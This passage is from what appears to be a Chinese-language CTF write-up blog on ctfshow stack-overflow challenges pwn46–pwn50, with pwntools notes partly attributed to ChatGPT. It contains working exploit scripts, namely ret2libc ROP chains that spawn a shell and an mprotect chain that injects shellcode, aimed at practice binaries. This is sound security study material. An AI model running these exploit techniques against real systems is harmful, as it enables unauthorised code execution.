<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn46&#x27;)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">main_addr = elf.sym[&#x27;main&#x27;]</span><br><span class="line">write_plt = elf.plt[&#x27;write&#x27;]</span><br><span class="line">write_got = elf.got[&#x27;write&#x27;]</span><br><span class="line">ret = 0x04004fe #0x00000000004004fe : ret</span><br><span class="line">rdi_ret = 0x0400803 # 0x0000000000400803 : pop rdi ; ret</span><br><span class="line">rsi_r15_ret = 0x0400801 # 0x0000000000400801 : pop rsi ; pop r15 ; ret</span><br><span class="line">padding = 0x70 + 8</span><br><span class="line"></span><br><span class="line">payload = b&#x27;a&#x27; * padding + p64(rdi_ret) + p64(1) + p64(rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)</span><br><span class="line">p.recvuntil(&quot;O.o?&quot;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">leak = p.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;)</span><br><span class="line">write = u64(leak)</span><br><span class="line">print(hex(write))</span><br><span class="line"></span><br><span class="line">from LibcSearcher import LibcSearcher</span><br><span class="line">libc = LibcSearcher(&#x27;write&#x27;,write)</span><br><span class="line"></span><br><span class="line">libc_base = write - libc.dump(&#x27;write&#x27;)</span><br><span class="line">sys = libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line">bin_sh = libc_base + libc.dump(&quot;str_bin_sh&quot;)</span><br><span class="line">payload1 = cyclic(padding) + p64(rdi_ret) + p64(bin_sh) + p64(sys)</span><br><span class="line">p.sendlineafter(&quot;O.o?&quot;,payload1)</span><br><span class="line">p.interactive()</span><br><span class="line"># tfshow@ubuntu:~/桌面/pwn$ file pwn46</span><br><span class="line"># pwn46: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e710e090d19149083dba276e9cd08dfbf0b131b2, not stripped</span><br><span class="line"># 3 - libc6_2.27-3ubuntu1.5_amd64</span><br></pre></td></tr></table></figure>
<p><strong>这里出现了一点点问题,使用puts泄露地址时payload1需要栈平衡,而使用write泄露地址时payload1不需要栈平衡</strong></p>
<p>以汇编举例</p>
<ol>
<li><code>puts@plt</code> 汇编（污染栈）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">puts@plt:</span><br><span class="line">   0x400520:    push   rax        ; ← 注意这里，压栈</span><br><span class="line">   0x400521:    jmp    qword ptr [rip + 0x200ad2] ; ← 跳转到 GOT 里的 puts 地址</span><br><span class="line">   0x400527:    nop    dword ptr [rax]</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ul>
<li><strong>push rax</strong>：先把<code>rax</code>压到栈上，占用8字节。</li>
<li><strong>jmp</strong>：[GOT表] 找真正的 <code>puts</code> 地址跳过去执行。</li>
</ul>
<p>这样一来，栈指针 <code>rsp</code> 往下走了 8 字节（<code>rsp = rsp - 8</code>），栈就<strong>不对齐了</strong>！</p>
<p>这就是为什么泄露完 <code>puts</code> 地址以后，打 <code>system</code> 前要插个额外的 <code>ret</code>，修一下。</p>
<hr>
<ol start="2">
<li><code>write@plt</code> 汇编（干净）</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">write@plt:</span><br><span class="line">   0x400530:    jmp    qword ptr [rip + 0x200abc] ; ← 直接跳 GOT</span><br><span class="line">   0x400536:    nop    dword ptr [rax]</span><br><span class="line">   0x40053a:    nop</span><br><span class="line">   0x40053b:    nop</span><br></pre></td></tr></table></figure>
<p>解释：</p>
<ul>
<li>只有一个简单的 <code>jmp</code>，直接跳过去，没有 <code>push</code> 任何东西。</li>
<li>栈指针 <code>rsp</code> <strong>完全没变</strong>，栈干干净净，完美保持对齐。</li>
</ul>
<p>所以泄露 <code>write</code> 地址以后，payload里直接打 <code>system</code>，不需要多加 <code>ret</code>！</p>
<table>
<thead>
<tr>
<th>操作</th>
<th>栈变化情况</th>
<th>是否需要补 ret</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>puts@plt</code></td>
<td><code>push rax</code> -&gt; 栈-8字节</td>
<td>✅ 要补一个 ret</td>
</tr>
<tr>
<td><code>write@plt</code></td>
<td>没有 push，只跳转</td>
<td>❌ 不需要 ret</td>
</tr>
</tbody>
</table>
<h1>pwn47</h1>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn47&#x27;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;puts: &quot;</span>)</span><br><span class="line">puts = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span> , drop = <span class="literal">True</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;gift: &quot;</span>)</span><br><span class="line">bin_sh = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span> , drop = <span class="literal">True</span>))</span><br><span class="line">padding = <span class="number">0x9c</span> + <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;puts&quot;</span>,puts)</span><br><span class="line"></span><br><span class="line">libc_base = puts - libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">system = libc_base + libc.dump(<span class="string">&quot;system&quot;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * padding + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><code>io.recvuntil(&quot;puts: &quot;)</code> 的意思是：</p>
<ul>
<li><strong>不停地接收程序发回的数据</strong>，直到遇到字符串 <code>&quot;puts: &quot;</code> 为止。</li>
<li>这一行是为了<strong>同步程序输出</strong>，<strong>等到puts地址开始出现的位置</strong>。</li>
<li>收到 <code>&quot;puts: &quot;</code> 后，光标就正好卡在<strong>地址</strong>那里（比如：<code>0xf7d40d90\n</code>）。</li>
</ul>
<p>​	<code>io.recvuntil(&quot;\n&quot;, drop=True)</code> 是：</p>
<ul>
<li>继续接收一行，直到遇到换行符<code>\n</code>。</li>
<li><code>drop=True</code> 表示：<strong>把末尾的<code>\n</code>丢掉</strong>，只留下实际的地址字符串（比如 <code>&quot;0xf7d40d90&quot;</code>）。</li>
</ul>
<p>然后用 <code>eval(...)</code> 把字符串转成整数类型：</p>
<ul>
<li><code>eval(&quot;0xf7d40d90&quot;)</code> 的结果就是真正的数值：<code>0xf7d40d90</code> （十六进制数，int类型）。</li>
</ul>
<h1>栈溢出前47总结(CHATGPT)</h1>
<h3 id="elf-ELF-pwn"><code>elf = ELF('./pwn')</code></h3>
<ul>
<li>这一行是用 <code>pwntools</code> 中的 <code>ELF</code> 类，<strong>加载你的本地程序文件</strong>（<code>./pwn</code>）为一个<code>ELF</code>对象。</li>
<li>加载完之后，<code>elf</code>对象里面就有很多有用的信息，比如：
<ul>
<li>程序里的各个符号（<code>elf.sym['puts']</code>、<code>elf.sym['main']</code>）</li>
<li>各个节（section）的位置（比如<code>.got</code>, <code>.plt</code>, <code>.text</code>）</li>
<li>libc依赖、入口点等等</li>
</ul>
</li>
</ul>
<p>之后可以通过 <code>elf</code> 很方便地<strong>拿地址、做payload</strong>。</p>
<h3 id="p-process-elf-path"><code>p = process(elf.path)</code></h3>
<p><strong>在本地</strong>，<strong>启动</strong>你给的那个可执行程序（elf），然后返回一个 <strong>可以交互的进程对象 p</strong>。</p>
<p><strong>ELF(‘./pwn’)和process(elf.path)的区别</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left"></th>
<th style="text-align:left"><code>ELF('./pwn')</code></th>
<th style="text-align:left"><code>process(elf.path)</code></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">本质上是</td>
<td style="text-align:left"><strong>读文件</strong></td>
<td style="text-align:left"><strong>运行程序</strong></td>
</tr>
<tr>
<td style="text-align:left">主要干嘛</td>
<td style="text-align:left">拿地址、拿符号、做静态分析</td>
<td style="text-align:left">打交互、发payload、跑exp</td>
</tr>
<tr>
<td style="text-align:left">结果是什么</td>
<td style="text-align:left">一个 <strong>ELF对象</strong>，像一本字典，查信息用的</td>
<td style="text-align:left">一个 <strong>Process对象</strong>，像是一个真正开的窗口，可以收发数据</td>
</tr>
</tbody>
</table>
<h3 id="context-binary-elf"><code>context.binary = elf</code></h3>
<p>设置了 <code>context.binary</code>，后面<code>pwntools</code>可以<strong>自动根据你的程序文件</strong>，帮你决定很多事情，比如：</p>
<ul>
<li>自动知道是32位程序还是64位程序</li>
<li>自动知道是Linux系统</li>
<li>自动知道字节序</li>
</ul>
<p>这样你可以不用手动每次写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python复制编辑context.arch = &#x27;i386&#x27;</span><br><span class="line">context.os = &#x27;linux&#x27;</span><br><span class="line">context.endian = &#x27;little&#x27;</span><br></pre></td></tr></table></figure>
<hr>
<h3 id="context-log-level-debug"><strong><code>context.log_level = 'debug'</code></strong></h3>
<p><strong>普通 (<code>info</code>) 日志：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash复制编辑[+] Opening connection to pwn.challenge.ctf.show on port 28200</span><br><span class="line">[+] Sending payload: &#x27;AAAA...&#x27;</span><br><span class="line">[+] Receiving data...</span><br><span class="line">[+] Got Shell!</span><br></pre></td></tr></table></figure>
<p><strong>debug日志 (<code>context.log_level = 'debug'</code>)：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash复制编辑[DEBUG] Opening connection to pwn.challenge.ctf.show on port 28200</span><br><span class="line">[DEBUG] Connected!</span><br><span class="line">[DEBUG] Sending 156 bytes:</span><br><span class="line">    00000000  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  │AAAAAAAAAAAAAAAA│</span><br><span class="line">    ...</span><br><span class="line">[DEBUG] Receiving until b&#x27;puts: &#x27;</span><br><span class="line">[DEBUG] Received 10 bytes:</span><br><span class="line">    00000000  70 75 74 73 3a 20 30 78 38 30                  │puts: 0x80│</span><br><span class="line">[DEBUG] Processing address</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>你能看到<strong>每个细节</strong>，包括发出去的payload是什么内容，收到的数据是啥样的。</p>
<h3 id="sendline和send"><code>sendline和send</code></h3>
<table>
<thead>
<tr>
<th>函数</th>
<th>意义</th>
<th>特点</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>send(data)</code></td>
<td>直接<strong>发送原始数据</strong>（不会自动加换行）</td>
<td>手动控制发送内容</td>
</tr>
<tr>
<td><code>sendline(data)</code></td>
<td><strong>发送数据+自动在末尾加一个 <code>\n</code>（换行）</strong></td>
<td>模拟键盘敲回车</td>
</tr>
</tbody>
</table>
<h3 id="p-recv"><code>p.recv()</code></h3>
<p><code>p.recv()</code> 是 <strong>从程序（进程 p）里接收数据</strong> 的函数。<br>
就是：<strong>从目标程序那里读一段输出。</strong></p>
<table>
<thead>
<tr>
<th style="text-align:left">函数</th>
<th style="text-align:left">特点</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>recv()</code></td>
<td style="text-align:left">收原始数据（按字节），你自己决定什么时候停</td>
</tr>
<tr>
<td style="text-align:left"><code>recvuntil(b'some string')</code></td>
<td style="text-align:left">一直收，直到遇到指定字符串，比如提示符</td>
</tr>
<tr>
<td style="text-align:left"><code>recvline()</code></td>
<td style="text-align:left">一直收，直到遇到换行符 <code>\n</code></td>
</tr>
</tbody>
</table>
<p>recv也可以进行在指定语句发出之后进行发送payload.有些服务会卡着等你的输入，只有在它发出提示以后才要输入，不然发早了会乱。</p>
<table>
<thead>
<tr>
<th style="text-align:left">方法</th>
<th style="text-align:left">作用</th>
<th style="text-align:left">常用场景</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>p.recv()</code></td>
<td style="text-align:left">收数据（阻塞，收不定长）</td>
<td style="text-align:left">小心卡死，要配合超时</td>
</tr>
<tr>
<td style="text-align:left"><code>p.recv(n)</code></td>
<td style="text-align:left">收n个字节</td>
<td style="text-align:left">已知长度</td>
</tr>
<tr>
<td style="text-align:left"><code>p.recvuntil(b&quot;flag:&quot;)</code></td>
<td style="text-align:left">收到关键提示</td>
<td style="text-align:left">等待关键字出现</td>
</tr>
<tr>
<td style="text-align:left"><code>p.recvline()</code></td>
<td style="text-align:left">收到一行</td>
<td style="text-align:left">一般的输入提示</td>
</tr>
</tbody>
</table>
<h3 id="elf-sym-xxx-elf-plt-xxx-elf-got-xxx"><code>elf.sym['xxx']	elf.plt['xxx']	elf.got['xxx']</code></h3>
<table>
<thead>
<tr>
<th style="text-align:left">关键词</th>
<th style="text-align:left">全称</th>
<th style="text-align:left">主要作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">sym</td>
<td style="text-align:left">symbol table（符号表）</td>
<td style="text-align:left">记录程序中各种函数/变量的名字和地址</td>
</tr>
<tr>
<td style="text-align:left">plt</td>
<td style="text-align:left">Procedure Linkage Table（过程链接表）</td>
<td style="text-align:left"><strong>程序用来调用外部库函数</strong>的跳板</td>
</tr>
<tr>
<td style="text-align:left">got</td>
<td style="text-align:left">Global Offset Table（全局偏移表）</td>
<td style="text-align:left"><strong>记录外部库函数真实地址</strong>的表</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left">名称</th>
<th style="text-align:left">内容</th>
<th style="text-align:left">在pwn里作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">sym</td>
<td style="text-align:left">函数和变量的符号表</td>
<td style="text-align:left">找 main、win、useful_function 地址</td>
</tr>
<tr>
<td style="text-align:left">plt</td>
<td style="text-align:left">外部函数的中转跳板</td>
<td style="text-align:left">构造rop链时 call puts@plt</td>
</tr>
<tr>
<td style="text-align:left">got</td>
<td style="text-align:left">存外部函数的真实地址</td>
<td style="text-align:left">泄露libc地址，或者劫持got打system</td>
</tr>
</tbody>
</table>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">	sym</span><br><span class="line">Symbol Table:</span><br><span class="line">+----------+----------------+</span><br><span class="line">| Name     | Address         |</span><br><span class="line">+----------+----------------+</span><br><span class="line">| main     | 0x08048400      |</span><br><span class="line">| puts     | 0x08048390      |</span><br><span class="line">| win      | 0x08048500      |</span><br><span class="line">+----------+----------------+</span><br></pre></td></tr></table></figure>
<p>plt<br>
Procedure Linkage Table</p>
<ul>
<li>程序里写了 <code>puts(&quot;hello&quot;)</code></li>
<li>但是 <code>puts</code> 不在你自己程序里，在 libc 里！</li>
<li>这时候就需要 <strong>“链接”</strong> 外部的 <code>puts</code></li>
<li>因为不知道puts在哪，所以先跳到 <code>puts@plt</code></li>
<li><code>plt</code> 里一小段代码去查 <code>got</code></li>
<li>真正拿到puts地址再跳过去！</li>
</ul>
<p>got<br>
Global Offset Table</p>
<p>一开始，<code>got</code> 表长这样：</p>
<table>
<thead>
<tr>
<th>函数名</th>
<th>地址内容</th>
</tr>
</thead>
<tbody>
<tr>
<td>puts@got</td>
<td>0x00000000（未知）</td>
</tr>
<tr>
<td>fflush@got</td>
<td>0x00000000（未知）</td>
</tr>
<tr>
<td>read@got</td>
<td>0x00000000（未知）</td>
</tr>
</tbody>
</table>
<p>程序第一次用到 <code>puts</code> 的时候：</p>
<ul>
<li>发现 <code>puts@got</code> 是空的(为什么是空的?延时绑定机制)</li>
<li><code>plt</code> 自动去找真实的 <code>puts</code> 地址</li>
<li>把真实地址写回到 <code>puts@got</code></li>
<li>后面再用 puts，直接从 got 表拿地址走，超快</li>
</ul>
<h3 id="寄存器rdi、rsi、rdx、rcx、r8、r9"><code>寄存器rdi、rsi、rdx、rcx、r8、r9</code></h3>
<p>其在64位程序当中需要先将参数按顺序压入寄存器当中,如果参数个数超过了这六个寄存器的个数,那么从第七个开始就和32位程序一样,将参数保存在栈上.</p>
<h3 id="栈平衡"><code>栈平衡</code></h3>
<p>极其简单讲:我们的p64或者p32必须是偶数个,如果不够用ret或者空来凑</p>
<h3 id="ROPgadget-查看ret地址"><code>ROPgadget 查看ret地址</code></h3>
<p>ROPgadget --binary 文件名 --only “pop|ret”</p>
<h3 id="objdump"><code>objdump </code></h3>
<p>将二进制文件（如可执行文件或目标文件）中的机器代码转换成汇编语言代码</p>
<p>查看段	表等信息</p>
<p>objdump -d -j .plt 文件名</p>
<h3 id="LibcSearcher-libc-dump-xxx"><code>LibcSearcher libc.dump('xxx')</code></h3>
<p><code>libc.dump</code> 是 <code>LibcSearcher</code> 中的一个方法，用于获取特定符号（比如函数名）的地址或偏移。</p>
<p><code>libc.symbols['puts']</code> 来直接获取 <code>puts</code> 的偏移地址。</p>
<h3 id="p64-和-p32"><code>p64 和 p32</code></h3>
<p><strong><code>p32</code></strong>：将一个 32 位的整数（4 字节）转换为小端字节顺序（Little Endian）的字节串。</p>
<p><strong><code>p64</code></strong>：将一个 64 位的整数（8 字节）转换为小端字节顺序的字节串。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">number = 0x12345678</span><br><span class="line">byte_sequence = p32(number)</span><br><span class="line">print(byte_sequence)  # 输出: b&#x27;xV4\x12&#x27;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">number = 0x1234567890abcdef</span><br><span class="line"># 使用p64转换为8字节的小端字节序列</span><br><span class="line">byte_sequence = p64(number)</span><br><span class="line">print(byte_sequence)  # 输出: b&#x27;\xef\xcd\xab\x90\x78\x56\x34\x12&#x27;</span><br></pre></td></tr></table></figure>
<h3 id="320xf764-0x7f"><code>32	0xf7	64 0x7f</code></h3>
<p><strong>32位</strong>某个泄漏地址可能是 <code>0xf7d40d90</code>，在这个地址的字节序列中，<code>0xf7</code> 就是它的最高字节</p>
<p>0x7ffff7dd24d0</p>
<p><strong>64位</strong>某个泄漏地址可能是 <code>0x7ffff7dd24d0</code>，在这个地址的字节序列中，<code>0x7f</code> 就是它的最高字节</p>
<p>32位<code>[-4:]</code> 是 Python 的切片操作，用于获取序列（如字符串、字节串等）的最后 4 个元素</p>
<p>64位<code>[-8:]</code>也是 Python 的切片操作，用于获取序列（如字符串、字节串等）的最后 8个元素<br>
在某些64位环境中，程序可能会省略高位字节 <code>0x7f</code> 或将其作为常量。你得到的 6 字节可能就代表了地址的低 6 个字节。后面拼接上ljust(8, b’\x00’),该<strong>左对齐</strong> 字符串表示以\x00补齐8个字节</p>
<h3 id="64padding后需要ret进行栈平衡"><code>64		padding后需要ret进行栈平衡</code></h3>
<p>以下是常见函数在 <strong>x86-64 (AMD64)</strong> 环境下是否需要 <code>ret</code> 的总结：</p>
<table>
<thead>
<tr>
<th style="text-align:left"><strong>函数</strong></th>
<th style="text-align:left"><strong>是否需要 <code>ret</code> 对齐？</strong></th>
<th style="text-align:left"><strong>原因</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>system</code></td>
<td style="text-align:left"><strong>需要</strong></td>
<td style="text-align:left">内部可能使用 <code>movaps</code> 指令，要求 <code>rsp % 16 == 0</code></td>
</tr>
<tr>
<td style="text-align:left"><code>puts</code></td>
<td style="text-align:left"><strong>需要</strong></td>
<td style="text-align:left">类似 <code>system</code>，依赖 <code>movaps</code></td>
</tr>
<tr>
<td style="text-align:left"><code>printf</code></td>
<td style="text-align:left"><strong>需要</strong></td>
<td style="text-align:left">可能调用 <code>movaps</code></td>
</tr>
<tr>
<td style="text-align:left"><code>execve</code></td>
<td style="text-align:left"><strong>需要</strong></td>
<td style="text-align:left">系统调用封装可能涉及对齐检查</td>
</tr>
<tr>
<td style="text-align:left"><code>main</code></td>
<td style="text-align:left"><strong>视情况</strong></td>
<td style="text-align:left">如果 <code>main</code> 调用了 <code>system</code>/<code>puts</code> 则需要</td>
</tr>
<tr>
<td style="text-align:left"><code>write</code></td>
<td style="text-align:left"><strong>不需要</strong></td>
<td style="text-align:left">直接走 <code>syscall</code>，不依赖 <code>movaps</code></td>
</tr>
<tr>
<td style="text-align:left"><code>read</code></td>
<td style="text-align:left"><strong>不需要</strong></td>
<td style="text-align:left">直接走 <code>syscall</code>，无对齐要求</td>
</tr>
<tr>
<td style="text-align:left"><code>gets</code></td>
<td style="text-align:left"><strong>不需要</strong></td>
<td style="text-align:left">不涉及 <code>movaps</code></td>
</tr>
<tr>
<td style="text-align:left"><code>strcpy</code></td>
<td style="text-align:left"><strong>不需要</strong></td>
<td style="text-align:left">无栈对齐要求</td>
</tr>
<tr>
<td style="text-align:left"><code>memset</code></td>
<td style="text-align:left"><strong>不需要</strong></td>
<td style="text-align:left">无栈对齐要求</td>
</tr>
<tr>
<td style="text-align:left"><code>memcpy</code></td>
<td style="text-align:left"><strong>不需要</strong></td>
<td style="text-align:left">无栈对齐要求</td>
</tr>
<tr>
<td style="text-align:left"><code>open</code></td>
<td style="text-align:left"><strong>不需要</strong></td>
<td style="text-align:left">系统调用无对齐要求</td>
</tr>
<tr>
<td style="text-align:left"><code>exit</code></td>
<td style="text-align:left"><strong>不需要</strong></td>
<td style="text-align:left">无栈对齐要求</td>
</tr>
</tbody>
</table>
<h1>pwn49</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">静态编译？或许你可以找找mprotect函数</span><br></pre></td></tr></table></figure>
<p>我们之前做的题目都是动态编译的题目,也就是调用外部libc库<br>
<img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250427204801153-174638660202510.png" alt="image-20250427204801153"></p>
<p>pwn48是动态编译的题目,pwn49是静态编译的题目,我们可以看出来静态编译的pwn49的文件大小明显比pwn48要大.</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250427205508317-174638660202511.png" alt="image-20250427205508317"></p>
<p>怎样理解静态编译:把libc塞到文件里边.</p>
<p><code>mprotect函数</code>:可以修改调用进程内存页的保护属性.<strong>这个函数可以把一段地址改成可读可写可执行权限</strong>，然后写入我们的shellcode就可以执行了.全称位memory protection内存保护</p>
<p>在Linux中，mprotect()函数可以用来修改一段指定内存区域的保护属性。</p>
<p>函数原型如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#include &lt;unistd.h&gt;   </span><br><span class="line">#include &lt;sys/mmap.h&gt;   </span><br><span class="line">int mprotect(const void *start, size_t len, int prot);</span><br></pre></td></tr></table></figure>
<p>mprotect()函数把自start开始的、长度为len的内存区的保护属性修改为prot指定的值。</p>
<p>prot可以取以下几个值，并且可以用“|”将几个属性合起来使用：</p>
<p>1）PROT_READ：表示内存段内的内容可读；</p>
<p>2）PROT_WRITE：表示内存段内的内容可写；</p>
<p>3）PROT_EXEC：表示内存段中的内容可执行；</p>
<p>4）PROT_NONE：表示内存段中的内容根本没法访问。</p>
<p>需要指出的是，锁指定的内存区间必须包含整个内存页（4K）。区间开始的地址start必须是一个内存页的起始地址，并且区间长度len必须是页大小的整数倍。</p>
<p>如果执行成功，则返回0；如果执行失败，则返回-1，并且设置errno变量，说明具体因为什么原因造成调用失败。错误的原因主要有以下几个：</p>
<p>1）EACCES</p>
<p>该内存不能设置为相应权限。这是可能发生的，比如，如果你 mmap(2) 映射一个文件为只读的，接着使用 mprotect() 标志为 PROT_WRITE。</p>
<p>2）EINVAL</p>
<p>start 不是一个有效的指针，指向的不是某个内存页的开头。</p>
<p>3）ENOMEM</p>
<p>内核内部的结构体无法分配。</p>
<p>4）ENOMEM</p>
<p>进程的地址空间在区间 [start, start+len] 范围内是无效，或者有一个或多个内存页没有映射。</p>
<p>如果调用进程内存访问行为侵犯了这些设置的保护属性，内核会为该进程产生 SIGSEGV （Segmentation fault，段错误）信号，并且终止该进程。</p>
<p>参数prot:	r:4	w:2	x:1<br>
prot为7（1+2+4）就是rwx可读可写可执行，与linux文件属性用法类似</p>
<p><strong>开始做题</strong></p>
<p>ida起手,ctfshow()方法当中的read:0x12 + 4达到栈溢出</p>
<p>有栈溢出,那就可以控制程序的执行流了</p>
<p>接下来找mprotect()函数来整出来可读可写可执行的bss(即:段),以便写sys和sh然后执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb pwn49</span><br><span class="line">start</span><br><span class="line">disass mprotect</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250427210029550-174638660202513.png" alt="image-20250427210029550"></p>
<p>mprotect的起始地址为0x0806cdd0,也就是说这个地址可以作为溢出的返回地址</p>
<p>接下来传入参数(无论是多少位的程序,只要参数要通过栈传递就需要pop)</p>
<p>mprotect需要传递三个参数,所以这里要选择有三个pop一个ret的ROP</p>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250428184952645-174638660202512.png" alt="image-20250428184952645">图中3个pop1个ret的都可以.其实pop到哪个寄存器不重要(真的吗?不知道啊,但是我这里选择图中这个就可以)</p>
<p>这里选择第一个圈当中的pop地址0x080a019b</p>
<p>1.start参数<br>
这里选择.got.plt<br>
选择修改 <code>.got.plt</code> 而不是 <code>.got</code> 是因为 <code>.got.plt</code> 涉及延迟绑定的机制，修改它更容易劫持程序的执行流，尤其是当程序首次调用外部函数时。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">readelf -S pwn49</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250427212548431-174638660202514.png" alt="image-20250427212548431"></p>
<p>.got.plt	0x080da000</p>
<p>2.lenth参数</p>
<p>用0x1000,足够我们shellcode使用</p>
<p>3.prot参数</p>
<p>prot权限参数就是7,可读可写可执行</p>
<p>权限修改了,然后考虑mprotect的返回地址,既然我们要往bss写然后执行bss的内容,我们就要使用与写有关的函数,这里用read(因为反汇编当中有read)</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gdb pwn49</span><br><span class="line">start</span><br><span class="line">disass ctfshow</span><br></pre></td></tr></table></figure>
<p><img src="/2025/05/05/%E6%A0%88%E6%BA%A2%E5%87%BA/image-20250427213027833-174638660202515.png" alt="image-20250427213027833"></p>
<p>read	0x080488c3</p>
<p>然后就是read的参数和返回地址</p>
<p>1.fd</p>
<p>fd为1</p>
<p>2.buf</p>
<p>buf为shellcode的地址</p>
<p>3.count</p>
<p>count为shellcode的长度</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssize_t read(int fd, void *buf, size_t count);</span><br><span class="line">int mprotect(const void *start, size_t len, int prot);</span><br></pre></td></tr></table></figure>
<p>一个payload<br>
padding的返回地址为mprotect,然后跟着3pop1ret来传入mprotect的三个参数,随后返回地址为read的地址,然后紧跟3pop1ret来传入read的三个参数,最后read的返回地址为我们写入bss的地址.</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn49&quot;</span>)</span><br><span class="line">context.binary = elf</span><br><span class="line">p = process(elf.path)</span><br><span class="line"></span><br><span class="line">padding = <span class="number">0x12</span> + <span class="number">4</span></span><br><span class="line">mprotect = elf.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">pop3_ret1 = <span class="number">0x080a019b</span></span><br><span class="line">start = <span class="number">0x080da000</span></span><br><span class="line">length = <span class="number">0x1000</span></span><br><span class="line">proc = <span class="number">7</span></span><br><span class="line"></span><br><span class="line">payload1 = cyclic(padding) + p32(mprotect) + p32(pop3_ret1) + p32(start) + p32(length) + p32(proc)</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh(),arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line">fd = <span class="number">0</span></span><br><span class="line">buf = <span class="number">0x080da000</span></span><br><span class="line">count = <span class="built_in">len</span>(shellcode)</span><br><span class="line">read = elf.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(read))</span><br><span class="line">payload1 += p32(read) + p32(pop3_ret1) + p32(fd) + p32(buf) + p32(count) + p32(start)</span><br><span class="line">p.recvuntil(<span class="string">&quot;    * *************************************                           &quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.send(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h1>pwn50</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">好像哪里不一样了</span><br><span class="line"></span><br><span class="line">远程libc环境 Ubuntu 18</span><br></pre></td></tr></table></figure>
<p>libc</p>
